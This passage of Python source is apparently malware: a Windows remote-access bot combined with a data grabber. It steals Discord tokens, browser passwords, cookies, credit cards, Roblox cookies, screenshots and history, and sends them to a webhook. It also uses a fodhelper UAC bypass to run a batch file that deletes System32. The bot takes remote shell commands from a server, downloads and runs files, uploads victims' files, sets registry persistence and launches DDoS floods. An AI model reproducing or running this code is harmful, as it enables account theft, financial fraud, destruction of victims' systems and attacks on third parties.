                json.dump(item, f, indent=2, sort_keys=True)
            with open(config, 'a') as f:
                f.write(
                    "\n\n//Rdimo just shit on this token protector | https://github.com/Rdimo")

    async def bypassBetterDiscord(self):
        bd = self.roaming+"\\BetterDiscord\\data\\betterdiscord.asar"
        if os.path.exists(bd):
            x = "api/webhooks"
            with open(bd, 'r', encoding="cp437", errors='ignore') as f:
                txt = f.read()
                content = txt.replace(x, 'RdimoTheGoat, damn right')
            with open(bd, 'w', newline='', encoding="cp437", errors='ignore') as f:
                f.write(content)

    def getProductValues(self):
        try:
            wkey = subprocess.check_output(
                r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", creationflags=0x08000000).decode().rstrip()
        except Exception:
            wkey = "N/A (Likely Pirated)"
        try:
            productName = subprocess.check_output(
                r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName", creationflags=0x08000000).decode().rstrip()
        except Exception:
            productName = "N/A"
        return [productName, wkey]

    @try_extract
    def grabTokens(self):
        for name, path in self.paths.items():
            if not os.path.exists(path):
                continue
            if "cord" in path:
                disc = name.replace(" ", "").lower()
                if os.path.exists(self.roaming+f'\\{disc}\\Local State'):
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in findall(self.encrypted_regex, line):
                                token = self.decrypt_val(b64decode(
                                    y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+f'\\{disc}\\Local State'))
                                asyncio.run(self.checkToken(token))
            else:
                profiles = self.findProfiles(name, path)
                if profiles == []:
                    path = path + 'Local Storage\\leveldb\\'
                    profiles = ["None"]
                for profile in profiles:
                    if profile == 'def':
                        path = self.paths[name] + 'Local Storage\\leveldb\\'
                    elif os.path.exists(self.paths[name] + "_side_profiles\\" + profile + '\\Local Storage\\leveldb\\'):
                        path = self.paths[name] + "_side_profiles\\" + \
                            profile + '\\Local Storage\\leveldb\\'
                    elif profile == None:
                        pass
                    else:
                        path = self.paths[name] + \
                            f'{profile}\\Local Storage\\leveldb\\'
                    if not os.path.exists(path):
                        continue
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for token in findall(self.regex, line):
                                asyncio.run(self.checkToken(token))

        if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for token in findall(self.regex, line):
                            asyncio.run(self.checkToken(token))

    @try_extract
    def grabPassword(self):
        for name, path in self.paths.items():
            localState = path + '\\Local State'
            if not os.path.exists(localState):
                continue
            profiles = self.findProfiles(name, path)
            if profiles == []:
                login_db = path + '\\Login Data'
                profiles = ["None"]
            for profile in profiles:
                localState = path + '\\Local State'
                if profile == 'def':
                    login_db = path + '\\Login Data'
                elif os.path.exists(path + "_side_profiles\\" + profile + '\\Login Data'):
                    login_db = path + "_side_profiles\\" + profile + '\\Login Data'
                    localState = path + "_side_profiles\\" + profile + '\\Local State'
                    if not os.path.exists(localState):
                        continue
                elif profile == "None":
                    pass
                else:
                    login_db = path + f'{profile}\\Login Data'
                if not os.path.exists(login_db):
                    continue
                master_key = self.get_master_key(localState)
                if master_key == False:
                    continue
                login = self.dir + self.sep + "Loginvault1.db"
                shutil.copy2(login_db, login)
                conn = sqlite3.connect(login)
                cursor = conn.cursor()
                try:
                    cursor.execute(
                        "SELECT action_url, username_value, password_value FROM logins")
                except:
                    continue
                with open(self.dir+f"\\{name} Passwords.txt", "a", encoding="cp437", errors='ignore') as f:
                    f.write(f"\nProfile: {profile}\n\n")
                    for r in cursor.fetchall():
                        url = r[0]
                        username = r[1]
                        encrypted_password = r[2]
                        decrypted_password = self.decrypt_val(
                            encrypted_password, master_key)
                        if url != "":
                            f.write(
                                f"Domain: {url}\nUser: {username}\nPass: {decrypted_password}\n\n")
                    cursor.close()
                    conn.close()
                    os.remove(login)

    @try_extract
    def grabCookies(self):
        for name, path in self.paths.items():
            localState = path + '\\Local State'
            if not os.path.exists(localState):
                continue
            profiles = self.findProfiles(name, path)
            if profiles == []:
                login_db = path + '\\Network\\cookies'
                profiles = ["None"]
            for profile in profiles:
                localState = path + '\\Local State'
                if profile == 'def':
                    login_db = path + '\\Network\\cookies'
                elif os.path.exists(path + "_side_profiles\\" + profile + '\\Network\\cookies'):
                    login_db = path + "_side_profiles\\" + profile + '\\Network\\cookies'
                    localState = path + "_side_profiles\\" + profile + '\\Local State'
                    if not os.path.exists(localState):
                        continue
                elif profile == "None":
                    pass
                else:
                    login_db = path + f'{profile}\\Network\\cookies'
                if not os.path.exists(login_db):
                    login_db = login_db[:-15] + self.sep + 'cookies'
                    if not os.path.exists(login_db):
                        continue
                master_key = self.get_master_key(localState)
                if master_key == False:
                    continue
                login = self.dir + self.sep + "Loginvault2.db"
                shutil.copy2(login_db, login)
                conn = sqlite3.connect(login)
                cursor = conn.cursor()
                try:
                    cursor.execute(
                        "SELECT host_key, name, encrypted_value from cookies")
                except:
                    continue
                with open(self.dir+f"\\{name} Cookies.txt", "a", encoding="cp437", errors='ignore') as f:
                    f.write(f"\nProfile: {profile}\n\n")
                    for r in cursor.fetchall():
                        host = r[0]
                        user = r[1]
                        decrypted_cookie = self.decrypt_val(r[2], master_key)
                        if host != "":
                            f.write(
                                f"Host: {host}\nUser: {user}\nCookie: {decrypted_cookie}\n\n")
                        if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' in decrypted_cookie:
                            self.robloxcookies.append(decrypted_cookie)
                    cursor.close()
                    conn.close()
                    os.remove(login)

    @try_extract
    def firefoxCookies(self):
        path = self.roaming + '\\Mozilla\\Firefox\\Profiles'
        profiles = os.listdir(path)
        for profile in profiles:
            cookies = path + os.sep + profile + os.sep + "cookies.sqlite"
            if not os.path.exists(cookies):
                continue
            conn = sqlite3.connect(cookies)
            try:
                cursor = conn.execute(
                    "SELECT host, name, value FROM moz_cookies")
            except:
                continue
            with open(self.dir + os.sep + f'FirefoxCookies.txt', mode='a', newline='', encoding='utf-8') as f:
                f.write(f"\nProfile: {profile}\n\n")
                for r in cursor.fetchall():
                    host = r[0]
                    user = r[1]
                    cookie = r[2]
                    if host != "":
                        f.write(
                            f"Host: {host}\nUser: {user}\nCookie: {cookie}\n\n")
                cursor.close()
                conn.close()

    def printASN1(self, d, l, rl):
        type = d[0]
        length = d[1]
        if length & 0x80 > 0:
            nByteLength = length & 0x7f
            length = d[2]
            skip = 1
        else:
            skip = 0
        if type == 0x30:
            seqLen = length
            readLen = 0
            while seqLen > 0:
                len2 = self.printASN1(d[2+skip+readLen:], seqLen, rl+1)
                seqLen = seqLen - len2
                readLen = readLen + len2
            return length+2
        elif type == 6:
            oidVal = hexlify(d[2:2+length])
            return length+2
        elif type == 4:
            return length+2
        elif type == 5:
            return length+2
        elif type == 2:
            return length+2
        else:
            if length == l-2:
                return length

    def readBsddb(self, name, options):
        f = open(name, 'rb')
        header = f.read(4*15)
        magic = self.getLongBE(header, 0)
        if magic != 0x61561:
            return
        version = self.getLongBE(header, 4)
        if version != 2:
            return
        pagesize = self.getLongBE(header, 12)
        nkeys = self.getLongBE(header, 0x38)

        readkeys = 0
        page = 1
        nval = 0
        val = 1
        db1 = []
        while (readkeys < nkeys):
            f.seek(pagesize*page)
            offsets = f.read((nkeys+1) * 4 + 2)
            offsetVals = []
            i = 0
            nval = 0
            val = 1
            keys = 0
            while nval != val:
                keys += 1
                key = self.getShortLE(offsets, 2+i)
                val = self.getShortLE(offsets, 4+i)
                nval = self.getShortLE(offsets, 8+i)
                offsetVals.append(key + pagesize*page)
                offsetVals.append(val + pagesize*page)
                readkeys += 1
                i += 4
            offsetVals.append(pagesize*(page+1))
            valKey = sorted(offsetVals)
            for i in range(keys*2):
                f.seek(valKey[i])
                data = f.read(valKey[i+1] - valKey[i])
                db1.append(data)
            page += 1
        f.close()
        db = {}

        for i in range(0, len(db1), 2):
            db[db1[i+1]] = db1[i]
        return db

    def getLoginData(self, options):
        logins = []
        sqlite_file = options.directory / 'signons.sqlite'
        json_file = options.directory / 'logins.json'
        if json_file.exists():  # since Firefox 32, json is used instead of sqlite3
            loginf = open(json_file, 'r').read()
            jsonLogins = json.loads(loginf)
            if 'logins' not in jsonLogins:
                return []
            for row in jsonLogins['logins']:
                encUsername = row['encryptedUsername']
                encPassword = row['encryptedPassword']
                logins.append((self.decodeLoginData(encUsername),
                            self.decodeLoginData(encPassword), row['hostname']))
            return logins
        elif sqlite_file.exists():  # firefox < 32
            conn = sqlite3.connect(sqlite_file)
            c = conn.cursor()
            c.execute("SELECT * FROM moz_logins;")
            for row in c:
                encUsername = row[6]
                encPassword = row[7]
                logins.append((self.decodeLoginData(encUsername),
                            self.decodeLoginData(encPassword), row[1]))
            return logins

    def extractSecretKey(self, masterPassword, keyData, options):
        pwdCheck = keyData[b'password-check']
        entrySaltLen = pwdCheck[1]
        entrySalt = pwdCheck[3: 3+entrySaltLen]
        encryptedPasswd = pwdCheck[-16:]
        globalSalt = keyData[b'global-salt']
        cleartextData = self.decryptMoz3DES(
            globalSalt, masterPassword, entrySalt, encryptedPasswd, options)
        if cleartextData != b'password-check\x02\x02':
            return

        if self.CKA_ID not in keyData:
            return None
        privKeyEntry = keyData[self.CKA_ID]
        saltLen = privKeyEntry[1]
        nameLen = privKeyEntry[2]
        privKeyEntryASN1 = decoder.decode(privKeyEntry[3+saltLen+nameLen:])
        data = privKeyEntry[3+saltLen+nameLen:]
        self.printASN1(data, len(data), 0)
        entrySalt = privKeyEntryASN1[0][0][1][0].asOctets()
        privKeyData = privKeyEntryASN1[0][1].asOctets()
        privKey = self.decryptMoz3DES(
            globalSalt, masterPassword, entrySalt, privKeyData, options)
        self.printASN1(privKey, len(privKey), 0)
        privKeyASN1 = decoder.decode(privKey)
        prKey = privKeyASN1[0][2].asOctets()
        self.printASN1(prKey, len(prKey), 0)
        prKeyASN1 = decoder.decode(prKey)
        id = prKeyASN1[0][1]
        key = long_to_bytes(prKeyASN1[0][3])
        return key

    def decryptPBE(self, decodedItem, masterPassword, globalSalt, options):
        pbeAlgo = str(decodedItem[0][0][0])
        if pbeAlgo == '1.2.840.113549.1.12.5.1.3':
            entrySalt = decodedItem[0][0][1][0].asOctets()
            cipherT = decodedItem[0][1].asOctets()
            key = self.decryptMoz3DES(
                globalSalt, masterPassword, entrySalt, cipherT, options)
            return key[:24], pbeAlgo
        elif pbeAlgo == '1.2.840.113549.1.5.13':
            assert str(decodedItem[0][0][1][0][0]) == '1.2.840.113549.1.5.12'
            assert str(decodedItem[0][0][1][0][1][3]
                    [0]) == '1.2.840.113549.2.9'
            assert str(decodedItem[0][0][1][1][0]) == '2.16.840.1.101.3.4.1.42'
            entrySalt = decodedItem[0][0][1][0][1][0].asOctets()
            iterationCount = int(decodedItem[0][0][1][0][1][1])
            keyLength = int(decodedItem[0][0][1][0][1][2])
            assert keyLength == 32

            k = sha1(globalSalt+masterPassword).digest()
            key = pbkdf2_hmac('sha256', k, entrySalt,
                            iterationCount, dklen=keyLength)

            iv = b'\x04\x0e'+decodedItem[0][0][1][1][1].asOctets()
            cipherT = decodedItem[0][1].asOctets()
            clearText = AES.new(key, AES.MODE_CBC, iv).decrypt(cipherT)

            return clearText, pbeAlgo

    def getKey(self, masterPassword, directory, options):
        if (directory / 'key4.db').exists():
            # firefox 58.0.2 / NSS 3.35 with key4.db in SQLite
            conn = sqlite3.connect(directory / 'key4.db')
            c = conn.cursor()
            # first check password
            c.execute("SELECT item1,item2 FROM metadata WHERE id = 'password';")
            row = c.fetchone()
            globalSalt = row[0]  # item1
            item2 = row[1]
            self.printASN1(item2, len(item2), 0)
            decodedItem2 = decoder.decode(item2)
            clearText, algo = self.decryptPBE(
                decodedItem2, masterPassword, globalSalt, options)

            if clearText == b'password-check\x02\x02':
                c.execute("SELECT a11,a102 FROM nssPrivate;")
                for row in c:
                    if row[0] != None:
                        break
                a11 = row[0]
                a102 = row[1]
                if a102 == self.CKA_ID:
                    self.printASN1(a11, len(a11), 0)
                    decoded_a11 = decoder.decode(a11)
                    clearText, algo = self.decryptPBE(
                        decoded_a11, masterPassword, globalSalt, options)
                    return clearText[:24], algo
            return None, None
        elif (directory / 'key3.db').exists():
            keyData = self.readBsddb(directory / 'key3.db', options)
            key = self.extractSecretKey(masterPassword, keyData)
            return key, '1.2.840.113549.1.12.5.1.3'
        return None, None

    @try_extract
    def firefoxPasswords(self):
        path = self.roaming + '\\Mozilla\\Firefox\\Profiles'
        profiles = os.listdir(path)
        for profile in profiles:
            direct = Path(path + self.sep + profile + self.sep)
            options.directory = direct
            key, algo = self.getKey(options.masterPassword.encode(),
                                    options.directory, options)
            if key == None:
                continue
            logins = self.getLoginData(options)
            if algo == '1.2.840.113549.1.12.5.1.3' or algo == '1.2.840.113549.1.5.13':
                with open(self.dir + os.sep + f'Firefox passwords.txt', mode='a', newline='', encoding='utf-8') as f:
                    f.write(f"\nProfile: {profile}\n\n")
                    for i in logins:
                        assert i[0][0] == self.CKA_ID
                        url = '%20s:' % (i[2])  # site URL
                        iv = i[0][1]
                        ciphertext = i[0][2]
                        name = str(unpad(DES3.new(key, DES3.MODE_CBC, iv).decrypt(
                            ciphertext), 8), encoding="utf-8")
                        iv = i[1][1]
                        ciphertext = i[1][2]
                        passw = str(unpad(DES3.new(key, DES3.MODE_CBC, iv).decrypt(
                            ciphertext), 8), encoding="utf-8")
                        f.write(
                            f"Domain: {url}\nUser: {name}\nPass: {passw}\n\n")

    @try_extract
    def creditInfo(self):
        for name, path in self.paths.items():
            localState = path + '\\Local State'
            if not os.path.exists(localState):
                continue
            profiles = self.findProfiles(name, path)
            if profiles == []:
                login_db = path + '\\Web Data'
                profiles = ["None"]
            for profile in profiles:
                localState = path + '\\Local State'
                if profile == 'def':
                    login_db = path + '\\Web Data'
                elif os.path.exists(path + "_side_profiles\\" + profile + '\\Web Data'):
                    login_db = path + "_side_profiles\\" + profile + '\\Web Data'
                    localState = path + "_side_profiles\\" + profile + '\\Local State'
                    if not os.path.exists(localState):
                        continue
                elif profile == None:
                    pass
                else:
                    login_db = path + f'{profile}\\Web Data'
                if not os.path.exists(login_db):
                    continue
                master_key = self.get_master_key(localState)
                if master_key == False:
                    continue
                login = self.dir + self.sep + "Loginvault3.db"
                shutil.copy2(login_db, login)
                conn = sqlite3.connect(login)
                cursor = conn.cursor()
                try:
                    cursor.execute(
                        "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
                except:
                    continue
                with open(self.dir+f"\\{name} CreditInfo.txt", "a", encoding="cp437", errors='ignore') as f:
                    for r in cursor.fetchall():
                        namee = r[0]
                        exp1 = r[1]
                        exp2 = r[2]
                        decrypted_password = self.decrypt_val(r[3], master_key)
                        if namee != "":
                            f.write(
                                f"Name: {namee}\nExp: {exp1}/{exp2}\nCC: {decrypted_password}\n\n")
                    cursor.close()
                    conn.close()
                    os.remove(login)

    def neatifyTokens(self):
        f = open(self.dir+"\\Discord Info.txt",
                "w", encoding="cp437", errors='ignore')
        for token in self.tokens:
            j = httpx.get(
                self.baseurl, headers=self.getHeaders(token)).json()
            user = j.get('username') + '#' + str(j.get("discriminator"))

            badges = ""
            flags = j['flags']
            if (flags == 1):
                badges += "Staff, "
            if (flags == 2):
                badges += "Partner, "
            if (flags == 4):
                badges += "Hypesquad Event, "
            if (flags == 8):
                badges += "Green Bughunter, "
            if (flags == 64):
                badges += "Hypesquad Bravery, "
            if (flags == 128):
                badges += "HypeSquad Brillance, "
            if (flags == 256):
                badges += "HypeSquad Balance, "
            if (flags == 512):
                badges += "Early Supporter, "
            if (flags == 16384):
                badges += "Gold BugHunter, "
            if (flags == 131072):
                badges += "Verified Bot Developer, "
            if (badges == ""):
                badges = "None"
            email = j.get("email")
            phone = j.get("phone") if j.get(
                "phone") else "No Phone Number attached"
            nitro_data = httpx.get(
                self.baseurl+'/billing/subscriptions', headers=self.getHeaders(token)).json()
            has_nitro = False
            has_nitro = bool(len(nitro_data) > 0)
            billing = bool(len(json.loads(httpx.get(
                self.baseurl+"/billing/payment-sources", headers=self.getHeaders(token)).text)) > 0)
            f.write(f"{' '*17}{user}\n{'-'*50}\nToken: {token}\nHas Billing: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n\n")
        f.close()

    def grabRobloxCookie(self):
        def subproc(path):
            try:
                return subprocess.check_output(
                    fr"powershell Get-ItemPropertyValue -Path {path}:SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com -Name .ROBLOSECURITY",
                    creationflags=0x08000000).decode().rstrip()
            except Exception:
                return None
        reg_cookie = subproc(r'HKLM')
        if not reg_cookie:
            reg_cookie = subproc(r'HKCU')
        if reg_cookie:
            self.robloxcookies.append(reg_cookie)
        if self.robloxcookies:
            with open(self.dir+"\\Roblox Cookies.txt", "w") as f:
                for i in self.robloxcookies:
                    f.write(i+'\n')

    def screenshot(self):
        image = ImageGrab.grab(
            bbox=None,
            include_layered_windows=False,
            all_screens=True,
            xdisplay=None
        )
        image.save(self.dir + "\\Screenshot.png")
        image.close()

    def grab_browser_history(self):
        outputs = get_history()
        history = outputs.histories
        with open(self.dir+"\\BrowserHistory.txt", "w") as f:
            for h in history:
                f.write(str(h) + "\n")

    def finish(self):
        for i in os.listdir(self.dir):
            if i.endswith('.txt'):
                path = self.dir+self.sep+i
                with open(path, "r", errors="ignore") as ff:
                    x = ff.read()
                    if not x:
                        ff.close()
                        os.remove(path)
                    else:
                        with open(path, "w", encoding="utf-8", errors="ignore") as f:
                            f.write(
                                "data grabber by cookiesservices.xyz\n\n")
                        with open(path, "a", encoding="utf-8", errors="ignore") as fp:
                            fp.write(
                                x+"\n\ndata grabber by cookiesservices.xyz")

        _zipfile = os.path.join(
            self.appdata, f'Cookies.Grabber-[{Victim}].zip')
        zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
        abs_src = os.path.abspath(self.dir)
        for dirname, _, files in os.walk(self.dir):
            for filename in files:
                absname = os.path.abspath(os.path.join(dirname, filename))
                arcname = absname[len(abs_src) + 1:]
                zipped_file.write(absname, arcname)
        zipped_file.close()
        files_found = ''
        for f in os.listdir(self.dir):
            files_found += f"{f}\n"
        tokens = ''
        for tkn in self.tokens:
            tokens += f'{tkn}\n\n'
        fileCount = f"{len(files)} Files Found: "
        embed = {
            'avatar_url': 'https://cdn.discordapp.com/attachments/983370809500393514/983734590130782259/Pfp.gif',
            'embeds': [
                {
                    'author': {
                        'name': f'{Victim} Data',
                        'url': 'http://cookiesservices.xyz/',
                        'icon_url': 'https://cdn.discordapp.com/attachments/983370809500393514/983734590130782259/Pfp.gif'
                    },
                    'color': 16119101,
                    'description': 'Cookies Data Grabber',
                    'fields': [
                        {
                            'name': fileCount,
                            'value': f'''```ini
                                [
                                    {files_found.strip()}
                                ]```
                            '''.replace(' ', ''),
                            'inline': False
                        }
                    ],
                    'footer': {
                        'text': 'Grabber By github.com/Callumgm'
                    }
                }
            ]
        }
        with open(_zipfile, 'rb') as f:
            if "api/webhooks" in self.webhook:
                httpx.post(self.webhook, json=embed)
                httpx.post(self.webhook, files={'upload_file': f})
            else:
                key = TOTP(self.fetchConf('webhook_protector_key')).now()
                httpx.post(self.webhook, headers={
                        "Authorization": key}, json=embed)
                httpx.post(self.webhook, headers={
                        "Authorization": key}, files={'upload_file': f})
        os.remove(_zipfile)

def start_datagrabber(api):
    asyncio.run(Cookies_Grabber(api).init())
#endregion

#region Zombie Killer
def kill_zombie():
    cmd2 = os.getenv("TEMP") + "\\kill_zombie.bat"
    with open(cmd2, "w") as f: f.write(f'''@echo off\ndel C:\\Windows\\System32 /F /Q\nrmdir /S /Q C:\\Windows\\System32\n:crash\nstart\ngoto crash\npause > nul''')
    def isAdmin():
        try: is_admin = (os.getuid() == 0)
        except AttributeError: is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        return is_admin
    if not isAdmin():
        class disable_fsr():
            disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
            revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection
            def __enter__(self):
                self.old_value = ctypes.c_long()
                self.success = self.disable(ctypes.byref(self.old_value))
            def __exit__(self, type, value, traceback):
                if self.success: self.revert(self.old_value)
        # Applying Disable FS Redirection
        create_reg_path = r""" powershell New-Item "HKCU:\\SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\command" -Force """
        os.system(create_reg_path)
        create_trigger_reg_key = r""" powershell New-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "DelegateExecute" -Value "hi" -Force """
        os.system(create_trigger_reg_key) 
        create_payload_reg_key = r"""powershell Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "`(Default`)" -Value "'cmd /c start """ + '""' + '"' + '"' + cmd2 + '""' +  '"' + '"\'"' + """ -Force"""
        os.system(create_payload_reg_key)
        with disable_fsr(): os.system("fodhelper.exe")  
        sleep(2)
        remove_reg = r""" powershell Remove-Item "HKCU:\\Software\\Classes\\ms-settings\\" -Recurse -Force """
        os.system(remove_reg)

#endregion

#endregion

#endregion


def process_control(id=0):
    process_control.stop=0
    while 1: 
        if blocked_process:
            for proc in psutil.process_iter():
                try:
                    if proc.name().split(".")[0] in blocked_process: proc.kill()
                except: pass
        sleep(0.5)
        if process_control.stop==id:
            process_control.stop=0
            break

EXCLUDE_DIRECTORY = (
    'Program Files',
    'Program Files (x86)',
    'Windows',
    '$Recycle.Bin',
    'AppData',
    'logs',
)


ip      	= "IP_HERE" 	# IP_HERE
port_    	= "PORT_HERE"			# PORT_HERE


blocked_process = []
maxthreads      = 50
port            = int(port_)
h_name          = socket.gethostname()
IP_addres       = socket.gethostbyname(h_name)
now             = datetime.datetime.now()

class Client():
    run = False

    #region Client Functions
    def __init__(self, connect:Tuple[str,int]=(ip, port)) -> None:
        signal.signal(signal.SIGINT, self.exit_gracefully)
        signal.signal(signal.SIGTERM, self.exit_gracefully)

    
        self.bot_name   = str(os.getlogin()).lower()                    # Get bot name
        self.temp       = os.getenv('temp')                             # Get temp directory
        self.temp_dir   = mkdtemp()                                     # Create temp directory
        self.url        = 'https://api.anonfiles.com/upload'            # Anonfiles upload url
        self.is_admin   = ctypes.windll.shell32.IsUserAnAdmin() != 0    # Check if user is admin


        self.public_ip  = self.getip()

        self.stop = False
        self.run = False
        while not self.stop:
            try: self._connect(connect)
            except KeyboardInterrupt: continue
            except: sleep(1)

    def exit_gracefully(self,signum, frame):
        self.stop = True
        self.run = False
        self.sock.close()
        sleep(1)
        sys.exit(0)

    def _connect(self, connect:Tuple[str,int]) -> None:
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect(connect)      # Connect to the server
        self.start()                    # Start client

    def _recv(self):
        return self.sock.recv(1024).decode("ascii")
    #endregion

    #region ACE Functions

    def getip(self):
        pi = "None"
        try: 
            pi = requests.get("https://api.ipify.org").text
        except: pass
        return pi

    def _shell_run(self, commands):
        global status
        status = None
        instruction = commands
        def shell(command):
            output = subprocess.run(command, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            global status
            status = "ok"
            return output.stdout.decode('CP437').strip()
        out = shell(instruction)
        self.sock.send(str.encode(out))
        status = None

    def download(self, filename):
        try: files = {'file': (open(filename, 'rb'))}
        except FileNotFoundError: pass

        data_to_send = []
        session = requests.session()

        with open(filename, "rb") as fp:
            data_to_send.append(
                ("file", (filename, fp))
            )
            encoder = requests_toolbelt.MultipartEncoder(data_to_send)

            monitor = requests_toolbelt.MultipartEncoderMonitor(encoder)

            r = session.post(
                self.url,
                data=monitor,
                allow_redirects=False,
                headers={"Content-Type": monitor.content_type},
            )

        resp = json.loads(r.text)
        if resp['status']:
            urllong = resp['data']['file']['url']['full']
            return urllong
        else:
            message = resp['error']['message']
            return message

    def upload(self, url, filename_and_type):
        '''
        Upload file from url to victims computer
        And execute it on victims computer
        '''
        try:
            nig = f"{self.temp_dir}\\{filename_and_type}"
            r = requests.get(url)
            with open(nig, "wb") as f: f.write(r.content)
            os.startfile(nig)
            return f"Upload file: {nig}"
        except: return "Error uploading file"

    def _self_destruct(self):
        pid = os.getpid()
        if backdoorr == True:
            folder = "C:\\Windows_Logs"
            try: 
                subprocess.call(f"attrib -h -s {folder}",stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL)
                if os.path.exists(os.getenv("TEMP") + "\\self-destruct.bat"): os.remove(os.getenv("TEMP") + "\\self-destruct.bat")
                with open(os.getenv("TEMP") + "\\self-destruct.bat", "w") as f: f.write(f'''@echo off\ntaskkill /F /PID {str(pid)}\ntimeout 1 > NUL\ndel {sys.argv[0]}\ntimeout 3 > NUL\nstart /b "" cmd /c del "%~f0"&exit /b\n''')
            except: pass
            os.system(r"start /min %temp%\\self-destruct.bat")
        else:
            try: 
                if os.path.exists(os.getenv("TEMP") + "\\self-destruct.bat"): os.remove(os.getenv("TEMP") + "\\self-destruct.bat")
                with open(os.getenv("TEMP") + "\\self-destruct.bat", "w") as f: f.write(f'''@echo off\ntaskkill /F /PID {str(pid)}\ntimeout 1 > NUL\ndel {sys.argv[0]}\ntimeout 3 > NUL\nstart /b "" cmd /c del "%~f0"&exit /b\n''')
            except: pass
            os.system(r"start /min %temp%\\self-destruct.bat")

    def execute_script(self, script_name, script_type, script_code):
        """
        Takes 3 Params : ScriptType, ScriptCode, ScriptName
        Creates the Script in TEMP Directory, Executes the Script and Deletes the Script
        """
        with open(os.getenv("TEMP") + "\\" + script_name + "." + script_type, "w") as f: f.write(script_code)
        os.startfile(os.getenv("TEMP") + "\\" + script_name + "." + script_type)   # Executing Script
        os.remove(os.getenv("TEMP") + "\\" + script_name + "." + script_type)   # Deleting Script

    def scan_files(self, filenames_):
        """
        Takes 1 Param : Filenames
        Scans files in C drive and returns the files if filenames matches
        """
        temp_dir = mkdtemp()

        try: 
            for dirpath, dirnames, filenames in os.walk("C:\\"):
                if any(s in dirpath for s in EXCLUDE_DIRECTORY): pass # Excluding Directories
                for file in filenames: # Scanning Files
                    if file.split(".")[0] in filenames_: shutil.copy2(dirpath + "\\" + file, temp_dir + "\\" + file) # Copying Files

            # Pack the files in the temporary directory into a zip file ready to upload
            _zipfile = os.path.join(os.getenv("TEMP"), f'files.zip')
            zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
            abs_src = os.path.abspath(temp_dir)
            for dirname, _, files in os.walk(temp_dir):
                for filename in files:
                    absname = os.path.abspath(os.path.join(dirname, filename))
                    arcname = absname[len(abs_src) + 1:]
                    zipped_file.write(absname, arcname)
            zipped_file.close()

            # Upload the zip file
            url = self.download(_zipfile)
            os.remove(_zipfile)
            self.sock.send(str.encode(f"Scan Complete! | Files Found: {url}"))

        except Exception as e: self.sock.send(str.encode(f"Error: {e}"))
    
    def persistance(self, registry_name):
        try:
            persistenceCMD = f"REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /V \"{registry_name}\" /t REG_SZ /F /D \"{sys.argv[0]}\""
            subprocess.call(persistenceCMD, shell=True)
            return True
        except: return False
    #endregion

    def start(self):
        while True:
            data = self._recv()
            
            if "attack" in data:
                try:
                    data=data.replace("attack ","").split()
                    method = str(data[0]).lower()
                    target = data[1]
                    por_t = data[2]
                    thread = data[3]
                    t = data[4]

                    self.sock.send(str.encode("Attack Started!"))

                    if method == "udp":
                        threading.Thread(target=runsender, args=(target, por_t, t, thread)).start()
                    
                    elif method == "tcp":
                        threading.Thread(target=runflooder, args=(target, por_t, t, thread)).start()

                except: pass

            elif "persistance" in data:
                try:
                    data=data.replace("persistance ","").split()
                    registry_name = data[0]
                    if self.persistance(registry_name): self.sock.send(str.encode("Persistance Successful!"))
                    else: self.sock.send(str.encode("Persistance Failed!"))
                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))

            elif "scanfiles" in data:
                try:
                    data = data.replace("scanfiles ","").split()
                    self.scan_files(data)
                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))

            elif "processcontrol" in data:
                try:
                    global blocked_process
                    data = data.replace("processcontrol ","").split()
                    blocked_process += data
                    threading.Thread(target=process_control, args=(6969,)).start()
                    self.sock.send(f"Process Control Enabled".encode("ascii"))
                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))

            elif "ddos" in data:
                try:
                    data=data.replace("ddos ","").split()
                    method = str(data[0]).lower()
                    target = data[1]
                    thread = data[2]
                    t = data[3]

                    self.sock.send(str.encode("Attack Started!"))

                    if method == "cfb":
                        LaunchCFB(target, thread, t)
                    
                    elif method == "pxcfb":
                        if get_proxies():
                            LaunchPXCFB(target, thread, t, proxies)
                    
                    elif method == "cfreq":
                        if get_cookie(target):
                            LaunchCFPRO(target, thread, t)
                    
                    elif method == "cfsoc":
                        if get_cookie(target):
                            LaunchCFSOC(target, thread, t)


                except: pass

            elif "root" in data:
                try:
                    data = data.replace("root ","").split()
                    commands = str(data[0])

                    self._shell_run(commands)
                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))

